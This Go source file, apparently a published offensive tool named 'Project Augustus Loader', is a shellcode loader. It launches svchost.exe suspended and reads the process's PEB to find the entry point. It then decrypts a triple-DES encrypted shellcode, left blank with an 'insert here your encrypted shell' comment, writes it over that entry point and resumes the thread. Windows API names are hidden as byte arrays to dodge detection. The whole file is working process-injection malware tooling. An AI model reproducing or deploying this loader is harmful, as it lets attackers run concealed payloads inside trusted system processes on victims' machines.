/*
            Project Augustus Loader
                VERSION: 1.0
 AUTHOR: @tunnelgre - https://twitter.com/tunnelgre
	              

*/

package main

import (
	"crypto/cipher"
	"crypto/des"
	"fmt"
	"os"
	"log"
	"syscall"
	"unsafe"
	"encoding/binary"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}


func main() {

	epath := []byte{
		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
	}
	path := string(epath)   //insert here your encrypted shell
	sch := []byte("")
	key := []byte("")
	iv := []byte("")

	_, err := os.Stat(path)
	if err != nil {
		log.Fatal(err)
	}

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 
	})).Call(0, uintptr(unsafe.Pointer(&pathArray[0])), 0, 0, 0, 0x4, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0
	syscall.MustLoadDLL(string([]byte{
		'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 
	})).Call(uintptr(processInfo.Process), 0, uintptr(unsafe.Pointer(basicInfo)), pointerSize*6, uintptr(unsafe.Pointer(&tmp)))

	imageBaseAddress := basicInfo.PebAddress + 0x10
	addressBuffer := make([]byte, pointerSize)
	read := 0
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
	decryptedsch, err := decryptDES3(sch, key, iv)
		syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 
	})).Call(uintptr(processInfo.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&decryptedsch[0])), uintptr(len(decryptedsch)), 0)

	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 
	})).Call(uintptr(processInfo.Thread))
}


func decryptDES3(ciphertext, key, iv []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}

	if len(ciphertext)%block.BlockSize() != 0 {
		return nil, fmt.Errorf("Ciphertext length is not a multiple of the block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)

	decrypted := make([]byte, len(ciphertext))
	mode.CryptBlocks(decrypted, ciphertext)

	decrypted = unpad(decrypted)

	return decrypted, nil
}

func unpad(data []byte) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}
